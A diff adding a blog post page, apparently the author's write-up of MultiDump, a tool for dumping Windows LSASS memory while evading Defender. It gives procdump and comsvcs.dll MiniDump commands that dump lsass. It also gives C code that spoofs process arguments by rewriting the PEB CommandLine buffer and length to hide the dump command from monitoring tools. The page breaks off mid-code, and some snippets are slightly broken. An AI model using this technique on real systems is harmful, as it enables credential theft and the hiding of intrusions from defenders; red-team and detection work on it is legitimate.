@@ -1,0 +1,784 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Dumping and extracting LSASS memory discreetly without alerting Defender.">
+<meta name="keywords" content=", tools, C, Python">
+<meta name="robots" content="noodp">
+<meta name="theme-color" content="">
+<link rel="canonical" href="https://Xre0uS.io/posts/multidump/">
+
+
+    <title>
+        
+            MultiDump - Xre0uS 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="https://Xre0uS.io/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+    
+        <link rel="stylesheet" href="https://Xre0uS.io/css/styles.css">
+    
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://Xre0uS.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://Xre0uS.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://Xre0uS.io/favicon-16x16.png">
+    <link rel="manifest" href="https://Xre0uS.io/site.webmanifest">
+    <link rel="mask-icon" href="https://Xre0uS.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://Xre0uS.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="MultiDump">
+<meta itemprop="description" content="Dumping and extracting LSASS memory discreetly without alerting Defender."><meta itemprop="datePublished" content="2024-02-02T00:00:00+00:00">
+<meta itemprop="dateModified" content="2024-02-26T00:00:00+00:00">
+<meta itemprop="wordCount" content="2893"><meta itemprop="image" content="https://Xre0uS.io">
+<meta itemprop="keywords" content="tools,C,Python,">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://Xre0uS.io"><meta name="twitter:title" content="MultiDump">
+<meta name="twitter:description" content="Dumping and extracting LSASS memory discreetly without alerting Defender.">
+
+
+
+    <meta property="og:title" content="MultiDump">
+<meta property="og:description" content="Dumping and extracting LSASS memory discreetly without alerting Defender.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://Xre0uS.io/posts/multidump/"><meta property="og:image" content="https://Xre0uS.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2024-02-02T00:00:00+00:00">
+<meta property="article:modified_time" content="2024-02-26T00:00:00+00:00">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+
+    <meta property="article:published_time" content="2024-02-02 00:00:00 +0000 UTC">
+
+
+
+
+
+
+
+
+
+
+
+    <script src="https://Xre0uS.io/js/main.js"></script>
+</head>
+
+
+
+<body>
+    
+
+    <div class="container">
+        <header class="header">
+    <span class="header__inner">
+        <span class="header__left">
+            <a href="https://Xre0uS.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text logo__pathname">
+                Xre0uS:/</span>
+            <span>#</span>
+            <span class="logo__cursor" style="
+                   background-color:#d4d4d4;
+                   animation-duration:1.5s;">
+            </span>
+        
+    </div>
+</a>
+
+        </span>
+        <span class="header__right">
+            
+            <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://Xre0uS.io/posts/">Posts</a></li><li><a href="https://Xre0uS.io/tools/">Tools</a></li><li><a href="https://Xre0uS.io/about/">About</a></li>
+    </ul>
+</nav>
+
+            <span class="menu-trigger">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M0 0h24v24H0z" fill="none"></path>
+                    <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+                </svg>
+            </span>
+            
+            <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+        <div class="content">
+            
+<main class="post">
+
+    <div class="post-info">
+        <p>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                <line x1="16" y1="2" x2="16" y2="6"></line>
+                <line x1="8" y1="2" x2="8" y2="6"></line>
+                <line x1="3" y1="10" x2="21" y2="10"></line>
+            </svg>
+
+            
+            2 Feb, 2024
+            
+
+            
+            (Last updated:
+            
+            26 Feb, 2024
+            )
+            
+        </p>
+        <p>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+                <circle cx="12" cy="12" r="10"></circle>
+                <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            14 minutes
+
+            
+        </p>
+    </div>
+
+    <article>
+        <h1 class="post-title">
+            <a href="https://Xre0uS.io/posts/multidump/">MultiDump</a>
+        </h1>
+
+        
+        <div class="post-excerpt">Dumping and extracting LSASS memory discreetly without alerting Defender.</div>
+        
+
+        
+        <hr>
+        <aside id="toc">
+            <div class="toc-title">Table of Contents</div>
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-is-lsass">What is LSASS?</a></li>
+    <li><a href="#procdumpexe--comsvcdll">ProcDump.exe &amp; Comsvc.dll</a></li>
+    <li><a href="#process-argument-spoofing">Process Argument Spoofing</a></li>
+    <li><a href="#constructing-the-real-command">Constructing the Real Command</a></li>
+    <li><a href="#modifying-commandlinebuffer">Modifying CommandLine.Buffer</a></li>
+    <li><a href="#the-magic-bytes">The Magic Bytes</a></li>
+    <li><a href="#the-handler--remote-mode">The Handler &amp; Remote Mode</a></li>
+    <li><a href="#other-evasion-techniques">Other Evasion Techniques</a></li>
+    <li><a href="#defending-and-detecting">Defending and Detecting</a></li>
+    <li><a href="#updates">Updates</a></li>
+    <li><a href="#testing-against-other-avs">Testing Against Other AVs</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr>
+
+        
+
+        <div class="post-content">
+            <div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/multidump-defender.gif" alt="multidump-defender.gif" class="flexible-image img-size-F">
+
+
+</div>
+<p>MultiDump is a post-exploitation tool written in C for dumping and extracting LSASS memory discreetly, without triggering Defender alerts, with a handler written in Python.</p>
+<p>GitHub repository: <a href="https://github.com/Xre0uS/MultiDump" target="_blank" rel="noopener noreferrer">https://github.com/Xre0uS/MultiDump</a></p>
+<h2 id="what-is-lsass">What is LSASS?</h2>
+<p>Local Security Authority Subsystem Service (LSASS) is an important component in the Windows operating system, with the primary function to enforce the security policy on the system. LSASS manages user authentication processes. When a user logs into a Windows machine, LSASS is responsible for handling the password verification. To facilitate this, it stores hashed versions of user passwords, providing a layer of security against password theft. It also handles domain authentication, maintain security tokens and manage domain credentials. Another key aspect of LSASS is its management of Kerberos tickets. Kerberos, an authentication protocol, is employed by Windows for network authentication in Active Directory. LSASS stores and manages these Kerberos tickets, which are used to establish secure communication and authentication across a network.</p>
+<p>Due to its central role in security-related functions, LSASS becomes a prime target for attackers. Gaining access to LSASS potentially allows an attacker to retrieve sensitive information like hashed passwords, domain credentials, and Kerberos tickets. This information can be exploited to escalate privileges, move laterally within a network, or maintain persistence in a compromised system.</p>
+<p>Dumping LSASS memory is a widely known and used technique, with the <a href="https://attack.mitre.org/techniques/T1003/001/" target="_blank" rel="noopener noreferrer">MITRE ATT&amp;CK ID of T1003.001</a>, one of the most well-known example being <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener noreferrer">Mimikatz</a> and its <code>sekurlsa::logonPasswords</code> method, which effectively extracts credentials from LSASS. However, its widespread recognition has led to it becoming easily detectable by most antivirus (AV) solutions. And the techniques are now well-documented and routinely flagged by modern security systems. So why not use legitimate binaries from Microsoft to dump LSASS’ memory? This approach is also known as <a href="https://lolbas-project.github.io/#" target="_blank" rel="noopener noreferrer">Living off the Land</a>, enter <code>ProcDump.exe</code> and <code>Comsvc.dll</code>.</p>
+<h2 id="procdumpexe--comsvcdll">ProcDump.exe &amp; Comsvc.dll</h2>
+<p><code>ProcDump.exe</code>, a part of the Sysinternals Suite, is a command-line utility designed for monitoring an application and generating crash dumps. However, its functionality can be repurposed to create a dump of the LSASS process without triggering the usual security alerts.</p>
+<p>Similarly, <code>Comsvc.dll</code>, primarily used for system configuration and management tasks, has a <code>minidump</code> export, which can be executed using <code>rundll32.exe</code>. Originally designed for legitimate debugging and system analysis purposes, can be repurposed to dump the memory of a process – in this case, LSASS.</p>
+<p>Now, these techniques are also nothing new, the classic</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>procdump.exe -accepteula -ma (<span style="color:#fff;font-weight:bold">Get-Process</span> lsass).id lsass.dmp
+</span></span></code></pre></div><p>or</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (<span style="color:#fff;font-weight:bold">Get-Process</span> lsass).id lsass.dmp full
+</span></span></code></pre></div><p>will easily get caught by AVs.</p>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/comsvcs-cmdline-dump.png" alt="comsvcs-cmdline-dump.png" class="flexible-image img-size-M">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/procdump-cmdline-dump.png" alt="procdump-cmdline-dump.png" class="flexible-image img-size-M">
+
+
+</div>
+<p>However, since they’re legitimate binaries, with <code>comsvcs.dll</code> being present in Windows by default, their presence would not usually raise alarms. It’s the combination of using those binaries on LSASS in a command that that gets detected. So how can we get past it?</p>
+<h2 id="process-argument-spoofing">Process Argument Spoofing</h2>
+<p>The <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb" target="_blank" rel="noopener noreferrer">The Process Environment Block (PEB)</a> structure holds information about a process, and inside the PEB structure, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters" target="_blank" rel="noopener noreferrer"><code>PRTL_USER_PROCESS_PARAMETERS</code></a> structure</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">struct</span> _RTL_USER_PROCESS_PARAMETERS {
+</span></span><span style="display:flex;"><span>  BYTE           Reserved1[<span style="color:#ff0;font-weight:bold">16</span>];
+</span></span><span style="display:flex;"><span>  PVOID          Reserved2[<span style="color:#ff0;font-weight:bold">10</span>];
+</span></span><span style="display:flex;"><span>  UNICODE_STRING ImagePathName;
+</span></span><span style="display:flex;"><span>  UNICODE_STRING CommandLine;
+</span></span><span style="display:flex;"><span>} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
+</span></span></code></pre></div><p>contains the <code>CommandLine</code> member which holds the command line arguments. <code>CommandLine</code> is defined as a <a href="https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string" target="_blank" rel="noopener noreferrer">UNICODE_STRING</a>:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">struct</span> _UNICODE_STRING {
+</span></span><span style="display:flex;"><span>  USHORT Length;
+</span></span><span style="display:flex;"><span>  USHORT MaximumLength;
+</span></span><span style="display:flex;"><span>  PWSTR  Buffer;
+</span></span><span style="display:flex;"><span>} UNICODE_STRING, *PUNICODE_STRING;
+</span></span></code></pre></div><p>So, to modify a process’ command line arguments in memory, we will need to start the process in a suspended state, and modify the <code>Buffer</code> element, using</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PEB-&gt;ProcessParameters.CommandLine.Buffer
+</span></span></code></pre></div><p>as a wide-character string.</p>
+<h2 id="constructing-the-real-command">Constructing the Real Command</h2>
+<p>Before the process can be created, we must first get the command to dump LSASS. MultiDump has two techniques to dump LSASS, using  <code>ProcDump.exe</code> or <code>Comsvc.dll</code>, as introduced earlier, and the commands used will be similar. For the static part of the command, it is encrypted using RC4, and decrypted using the undocumented Windows NTAPI <a href="https://source.winehq.org/WineAPI/SystemFunction032.html" target="_blank" rel="noopener noreferrer"><code>SystemFunction032</code></a> function. The location of files written to disk can be user defined, or by default, in the temp directory with a randomly generated name.</p>
+<p>We will also need the PID of LSASS for the command, this is done using <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation" target="_blank" rel="noopener noreferrer"><code>NtQuerySystemInformation</code></a>, it returns <code>ImageName</code> which contains the process name and <code>UniqueProcessId</code> which is the process ID. To use the function, we’ll need to get its address, since it is exported from the <code>ntdll.dll</code> module, it will require the use of <code>GetModuleHandle</code> and <code>GetProcAddress</code>. We then need to iterate through the returned processes, and compare the <code>ImageName</code> to the target process, in this case, <code>lsass.exe</code>:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL GetRemoteProcessInfo(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
+</span></span><span style="display:flex;"><span>fnNtQuerySystemInformation             pNtQuerySystemInformation = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>ULONG                                  uReturnLen1                  = <span style="color:#fff;font-weight:bold">NULL</span>,
+</span></span><span style="display:flex;"><span>                                    uReturnLen2                  = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>PSYSTEM_PROCESS_INFORMATION            SystemProcInfo               = <span style="color:#fff;font-weight:bold">NULL</span>,
+</span></span><span style="display:flex;"><span>                                      pOriginalSystemProcInfo      = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>PSYSTEM_THREAD_INFORMATION             SystemThreadInfo             = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>PVOID                                  pValueToFree                 = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>NTSTATUS                               STATUS                       = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>*threadCount = <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(<span style="color:#0ff;font-weight:bold">L</span><span style="color:#0ff;font-weight:bold">"NTDLL.DLL"</span>), <span style="color:#0ff;font-weight:bold">"NtQuerySystemInformation"</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">if</span> (pNtQuerySystemInformation == <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pNtQuerySystemInformation(SystemProcessInformation, <span style="color:#fff;font-weight:bold">NULL</span>, <span style="color:#fff;font-weight:bold">NULL</span>, &amp;uReturnLen1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">if</span> (SystemProcInfo == <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	pValueToFree = SystemProcInfo;
+</span></span><span style="display:flex;"><span>	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">if</span> (STATUS != <span style="color:#ff0;font-weight:bold">0x0</span>) {
+</span></span><span style="display:flex;"><span>		HeapFree(GetProcessHeap(), <span style="color:#ff0;font-weight:bold">0</span>, pValueToFree);
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>		<span style="color:#007f7f">// Comparing the enumerated process name to the intended target process
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>		<span style="color:#fff;font-weight:bold">if</span> (SystemProcInfo-&gt;ImageName.Length &amp;&amp; wcscmp(SystemProcInfo-&gt;ImageName.Buffer, szProcName) == <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span>			*pdwPid = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
+</span></span><span style="display:flex;"><span>			<span style="color:#fff;font-weight:bold">if</span> (phProcess != <span style="color:#fff;font-weight:bold">NULL</span>) { <span style="color:#007f7f">// Only open a handle if phProcess is not NULL
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>				*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#fff;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">if</span> (!SystemProcInfo-&gt;NextEntryOffset) {
+</span></span><span style="display:flex;"><span>			<span style="color:#fff;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	HeapFree(GetProcessHeap(), <span style="color:#ff0;font-weight:bold">0</span>, pValueToFree);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">if</span> (*pdwPid == <span style="color:#fff;font-weight:bold">NULL</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We need to be careful not to open a handle to the process, since opening a handle to LSASS is highly suspicious (also done by Mimikatz), and an easy way to get caught.</p>
+<p>Now, we have all the information we need to construct the command to dump LSASS.</p>
+<h2 id="modifying-commandlinebuffer">Modifying CommandLine.Buffer</h2>
+<p>To start, we need to create a suspended process, and passing a dummy arguments to the process, this dummy arguments can be anything, such as a legitimate looking command to throw off analysers. The process is created using <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw" target="_blank" rel="noopener noreferrer"><code>CreateProcessW</code></a> with the <code>CREATE_SUSPENDED</code> flag:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CreateProcessW(
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">NULL</span>,
+</span></span><span style="display:flex;"><span>	szProcess,
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">NULL</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">NULL</span>,
+</span></span><span style="display:flex;"><span>	FALSE,
+</span></span><span style="display:flex;"><span>	CREATE_SUSPENDED | CREATE_NO_WINDOW,
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">NULL</span>,
+</span></span><span style="display:flex;"><span>	currentDir,
+</span></span><span style="display:flex;"><span>	&amp;Si,
+</span></span><span style="display:flex;"><span>	&amp;Pi
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>After the process is created, we will need to get the PEB address, this can be done using <code>NtQueryInformationProcess</code> as mentioned earlier, with the <code>PROCESS_BASIC_INFORMATION</code>, which will return a <code>PROCESS_BASIC_INFORMATION</code> structure, containing the <code>PebBaseAddress</code> member:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">struct</span> _PROCESS_BASIC_INFORMATION {
+</span></span><span style="display:flex;"><span>    NTSTATUS ExitStatus;
+</span></span><span style="display:flex;"><span>    PPEB PebBaseAddress;
+</span></span><span style="display:flex;"><span>    ULONG_PTR AffinityMask;
+</span></span><span style="display:flex;"><span>    KPRIORITY BasePriority;
+</span></span><span style="display:flex;"><span>    ULONG_PTR UniqueProcessId;
+</span></span><span style="display:flex;"><span>    ULONG_PTR InheritedFromUniqueProcessId;
+</span></span><span style="display:flex;"><span>} PROCESS_BASIC_INFORMATION;
+</span></span></code></pre></div><p>With the address, we can use  the <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory" target="_blank" rel="noopener noreferrer"><code>ReadProcessMemory</code></a> function to read the data, the function will need to be called twice, first to read the PEB structure, and the second to read the <code>RTL_USER_PROCESS_PARAMETERS</code> structure, which contains the <code>CommandLine</code> member.</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {
+</span></span><span style="display:flex;"><span>	SIZE_T	sNmbrOfBytesRead = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">if</span> (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &amp;sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &amp;pPeb, <span style="color:#fff;font-weight:bold">sizeof</span>(PEB))
+</span></span><span style="display:flex;"><span>ReadFromTargetProcess(Pi.hProcess, pPeb-&gt;ProcessParameters, &amp;pParms, <span style="color:#fff;font-weight:bold">sizeof</span>(RTL_USER_PROCESS_PARAMETERS) + <span style="color:#ff0;font-weight:bold">0x200</span>)
+</span></span></code></pre></div><p>At this point, the process is still carrying the dummy arguments:</p>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/comsvcs-peb-dummy-args.png" alt="comsvcs-peb-dummy-args.png" class="flexible-image img-size-M">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/procdump-peb-dummy-args.png" alt="procdump-peb-dummy-args.png" class="flexible-image img-size-M">
+
+
+</div>
+<p>Note that the path to the executable have to be the same, since it is used by the Windows loader to create the process, and modifying it will affect the memory layout, module loading, and entry point.</p>
+<p>Now that we have read the structure, we can access and patch <code>CommandLine.Buffer</code> by using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" target="_blank" rel="noopener noreferrer"><code>WriteProcessMemory</code></a> function which require these parameters:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL WriteProcessMemory(
+</span></span><span style="display:flex;"><span>  [in]  HANDLE  hProcess,
+</span></span><span style="display:flex;"><span>  [in]  LPVOID  lpBaseAddress,
+</span></span><span style="display:flex;"><span>  [in]  LPCVOID lpBuffer,
+</span></span><span style="display:flex;"><span>  [in]  SIZE_T  nSize,
+</span></span><span style="display:flex;"><span>  [out] SIZE_T  *lpNumberOfBytesWritten
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p><code>lpBaseAddress</code> will be set to what is being written: <code>CommandLine.Buffer</code>, and <code>lpBuffer</code> will be a pointer to the real arguments we want to write. The <code>nSize</code> parameter is the size of the buffer to write in bytes, equal to the length of the string that’s being written multiplied by the size of <code>WCHAR</code> plus 1 for the null character:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>WriteToTargetProcess(Pi.hProcess, (PVOID)pParms-&gt;CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * <span style="color:#fff;font-weight:bold">sizeof</span>(WCHAR) + <span style="color:#ff0;font-weight:bold">1</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {
+</span></span><span style="display:flex;"><span>	SIZE_T sNmbrOfBytesWritten = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">if</span> (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &amp;sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can see process argument has been updated to the command that will dump LSASS:</p>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/comsvcs-peb-real-args.png" alt="comsvcs-peb-real-args.png" class="flexible-image img-size-M">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/procdump-peb-real-args.png" alt="procdump-peb-real-args.png" class="flexible-image img-size-M">
+
+
+</div>
+<p>However, using <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener noreferrer">Process Explorer</a>, we can still see the real commands:</p>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/comsvcs-pex-real-args.png" alt="comsvcs-pex-real-args.png" class="flexible-image img-size-L">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/procdump-pex-real-args.png" alt="procdump-pex-real-args.png" class="flexible-image img-size-L">
+
+
+</div>
+<p>This is because it also uses <code>NtQueryInformationProcess</code> to read the command line arguments in the PEB at runtime, and it can see what’s inside <code>CommandLine.Buffer</code> by reading up until the length specified by <code>CommandLine.Length</code>. So, to solve this issue, we can update the <code>CommandLine.Length</code> to the length of the executable path, effectively hiding the remaining commands:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb-&gt;ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&amp;dwNewLen, <span style="color:#fff;font-weight:bold">sizeof</span>(DWORD))
